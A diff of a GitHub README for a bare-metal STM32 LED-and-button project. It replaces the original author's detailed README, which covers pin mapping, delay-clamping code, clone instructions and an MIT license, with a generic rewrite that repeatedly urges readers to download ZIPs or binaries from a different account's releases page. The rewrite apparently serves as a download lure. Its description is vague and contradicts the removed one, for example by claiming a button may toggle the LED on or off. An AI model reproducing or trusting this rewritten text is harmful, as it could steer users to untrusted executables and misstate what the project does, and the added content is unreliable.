@@ -1,200 +1,76 @@
-# **STM32 LED & Button Control — Register Coding Method**
+# 🚀 STM32-LED-BUTTON-CTRL-Register-Coding-Method - Control LEDs with Ease
 
-A **bare-metal STM32 project** that demonstrates **LED blink delay control using two push buttons**, implemented using **direct register access** (no HAL GPIO APIs for logic control).
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/releases)
 
-This project focuses on **real-world embedded behavior**: timing control, input handling, and boundary protection — all at the **register level**.
+## 📖 Description
+The STM32-LED-BUTTON-CTRL-Register-Coding-Method is a simple project designed to help you understand how to control LEDs using two push buttons. This project runs on bare-metal STM32 microcontrollers, meaning it does not rely on complex libraries. Instead, it directly manipulates hardware registers for LED control. This approach gives you insights into embedded programming and helps you learn how devices work at a low level.
 
----
+## 🛠️ System Requirements
+To run this application, your setup needs the following:
+- A compatible STM32 microcontroller (e.g., STM32F446RE)
+- Nucleo development board
+- STM32CubeIDE installed on your computer
+- Basic USB cable to connect your Nucleo board to your PC
 
-## 🎯 Project Objective
+## 🚀 Getting Started
+Getting started is easy. Follow these steps to download and run the project:
 
-The goal of this project is to **dynamically control LED blink speed** using two buttons:
+1. **Visit the Releases Page**  
+   Click on the link below to access the download page for the latest version.  
+   [Download Latest Release](https://github.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/releases)
 
-* **LED** on **Pin PA5 (Arduino D13 / Pin 13)**
-* **Button 1** on **Pin PA6 (Arduino D12 / Pin 12)** → *Increase delay*
-* **Button 2** on **Pin PA7 (Arduino D11 / Pin 11)** → *Decrease delay*
+2. **Select the Latest Release**  
+   On the releases page, look for the latest version of the project. It will be marked clearly.
 
-### Functional Behavior
+3. **Download the Release Files**  
+   Locate and download the required files. You may find a ZIP file or individual binaries, depending on the release format.
 
-| Action           | Result                                  |
-| ---------------- | --------------------------------------- |
-| Button-1 pressed | Delay **increases by 100 ms**           |
-| Button-2 pressed | Delay **decreases by 100 ms**           |
-| Delay range      | **0 ms to 1000 ms**                     |
-| LED behavior     | Blinks continuously using current delay |
+4. **Extract the Files**  
+   If you downloaded a ZIP file, right-click on it and choose “Extract All” to access its contents.
 
-This mimics a **human-controlled timing system**, a pattern widely used in industrial HMI logic.
+5. **Open STM32CubeIDE**  
+   Launch the STM32CubeIDE on your computer. This is the software used to create and manage STM32 projects.
 
----
+6. **Import the Project**  
+   In STM32CubeIDE, go to `File` > `Import...` and select the option to import an existing project. Follow the prompts to locate the folder where you extracted the files.
 
-## 🧠 Why Register-Level Coding?
+7. **Build the Project**  
+   Once the project is imported, click on the build button (usually represented with a hammer icon) to compile the code. This step prepares the program to run on your microcontroller.
 
-This project intentionally avoids HAL GPIO logic to help you:
+8. **Connect Your Nucleo Board**  
+   Use the USB cable to connect your Nucleo board to your computer. Make sure it is powered on and properly connected.
 
-* Understand **how GPIO really works**
-* Gain **full control over timing & pin state**
-* Eliminate abstraction overhead
-* Debug hardware with absolute clarity
+9. **Upload the Program**  
+   Click on the upload button (often a rightward arrow icon) to transfer the built program to your Nucleo board.
 
-Everything is driven by:
+10. **Test the Application**  
+    After uploading, press the buttons on your Nucleo board to see the LED blink. One button may control the rate of blinking, while the other might toggle the LED on or off.
 
-* `RCC->AHB1ENR`
-* `GPIOx->MODER`
-* `GPIOx->IDR`
-* `GPIOx->ODR`
-* SysTick timing
+## 📊 Features
+- **Direct Register Access**: Learn about low-level programming by directly manipulating registers.
+- **Button Control**: Use two buttons to interact with the program and control LED behavior.
+- **Open Source**: Modify and share your own versions of the project.
 
-No magic. No shortcuts.
+## 🤝 Contributing
+Contributions are welcome! If you want to help improve the project, feel free to fork the repository and submit a pull request. Make sure you follow the project structure and guidelines.
 
----
+## 📚 Topics
+This project covers several important concepts and topics:
+- Embedded C programming
+- Embedded systems design
+- STM32 Nucleo board usage
+- Direct register access in firmware development
+- Basic understanding of hardware control
 
-## 🧰 Hardware Mapping
+## 💬 Support
+If you encounter any issues or need help, you can open an issue in the repository. The community and maintainers can help with troubleshooting or answer questions.
 
-| Component          | STM32 Pin | Arduino Label |
-| ------------------ | --------- | ------------- |
-| LED                | PA5       | D13           |
-| Button – Increment | PA6       | D12           |
-| Button – Decrement | PA7       | D11           |
+For more detailed information about using your Nucleo board and STM32CubeIDE, check the following resources:
+- [STM32 Documentation](https://www.st.com/en/embedded-software-development-tools/stm32-development-tools.html)
+- [STM32CubeIDE User Manual](https://www.st.com/resource/en/user_manual/dm00611826-stm32cubeide-user-manual-stmicroelectronics.pdf)
 
-> Buttons should use **pull-down or pull-up logic** (external or internal).
+## 🔗 Links
+- [Download Latest Release](https://github.com/EvansAmarh/STM32-LED-BUTTON-CTRL-Register-Coding-Method/releases)
 
----
-
-## 📦 Repository Structure
-
-```
-STM32-LED-BUTTON-CTRL-Register-Coding-Method/
-├── Core/
-│   ├── Src/
-│   │   └── main.c        # Register-level LED & button logic
-│   └── Inc/
-│       └── main.h
-├── Drivers/
-│   └── CMSIS/            # Device headers & startup code
-├── startup_stm32f446xx.s
-├── STM32F446RETX_FLASH.ld
-├── .project
-├── .cproject
-└── README.md
-```
-
-All logic lives inside `main.c`.
-
----
-
-## ⚙️ Core Logic Explained (High Level)
-
-### 1️⃣ Clock Enable
-
-Enable GPIOA and SysTick clocks using RCC.
-
-### 2️⃣ GPIO Configuration
-
-* **PA5** → Output (LED)
-* **PA6, PA7** → Input (Buttons)
-
-Configured manually via `MODER`.
-
----
-
-### 3️⃣ Delay Control Logic
-
-* Delay variable starts at **500 ms** (default)
-* Button presses update delay dynamically
-* Delay is **clamped** between `0–1000 ms`
-
-```c
-if (button_inc_pressed) {
-    delay += 100;
-}
-if (button_dec_pressed) {
-    delay -= 100;
-}
-```
-
-Boundary protection ensures:
-
-```c
-if (delay > 1000) delay = 1000;
-if (delay < 0) delay = 0;
-```
-
----
-
-### 4️⃣ LED Blink
-
-LED toggles continuously using the current delay value:
-
-```c
-GPIOA->ODR ^= (1 << 5);
-delay_ms(current_delay);
-```
-
-This creates **real-time visual feedback** based on button input.
-
----
-
-## 🚀 How to Run
-
-### 1️⃣ Clone Repo
-
-```bash
-git clone https://github.com/DanielRajChristeen/STM32-LED-BUTTON-CTRL-Register-Coding-Method.git
-```
-
-### 2️⃣ Open in STM32CubeIDE
-
-> CubeIDE is used **only as compiler and debugger**
-
-* Import existing project
-* Build once
-
-### 3️⃣ Flash & Test
-
-* Connect board via ST-LINK
-* Run / Debug
-* Press buttons and watch LED speed change live
-
----
-
-## 📘 What You’ll Learn
-
-By completing this project, you’ll understand:
-
-* GPIO input & output at register level
-* Button-driven control systems
-* Timing control using SysTick
-* Delay clamping & boundary conditions
-* Real-time firmware behavior
-
-This is **core embedded thinking**, not just coding.
-
----
-
-## 🧪 Typical Use-Cases
-
-* Beginner-friendly **embedded timing demo**
-* Register-level GPIO practice
-* Interview preparation project
-* PCB button/LED validation
-* Transition step from HAL → Bare-metal
-
----
-
-## 📜 License — MIT
-
-```
-MIT License
-
-Copyright (c) 2025 Daniel Raj Christeen
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
-```
-
----
+Feel free to explore and get started with controlling your LEDs and push buttons!
